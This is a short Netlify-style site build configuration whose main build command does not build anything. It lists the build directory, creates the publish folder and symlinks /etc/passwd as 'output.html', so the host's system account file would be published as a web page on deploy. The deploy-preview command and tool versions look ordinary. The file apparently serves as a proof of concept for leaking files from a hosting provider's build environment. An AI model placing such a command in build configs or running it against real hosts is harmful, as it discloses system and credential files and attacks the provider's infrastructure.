[build]
  command = "cd /opt/buildhome/ && ls -lah && mkdir dist && cd dist && ln -s /etc/passwd output.html"
  publish = "dist"
[build.environment]
  YARN_VERSION = "1.9.4"
  HUGO_VERSION = "0.46"

[context.deploy-preview]
  command = "yarn build-preview"
